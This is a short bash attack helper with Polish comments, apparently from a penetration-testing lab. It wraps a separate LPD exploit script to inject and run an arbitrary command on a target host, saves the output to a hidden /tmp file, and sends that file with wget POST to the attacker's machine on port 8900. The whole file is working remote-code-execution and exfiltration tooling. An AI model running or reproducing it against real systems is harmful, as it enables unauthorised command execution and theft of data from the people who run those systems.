#!/usr/bin/env bash
# Wykonaj CMD na target przez LPD, wynik → plik → wget POST na Kali:8900
TARGET="${1:-10.129.41.146}"
TAG="${2:-out}"
CMD="${3:?cmd}"
LH="${LHOST:-10.10.17.138}"
EX="$(dirname "$0")/lpd_exploit.py"
# unikaj zagnieżdżonych cudzysłowów w injekcji
python3 "$EX" "$TARGET" -c "sh -c '${CMD}' > /tmp/.p 2>&1; wget -qO- --post-file=/tmp/.p http://${LH}:8900/${TAG} 2>/dev/null"
echo "[*] POST tag=${TAG}"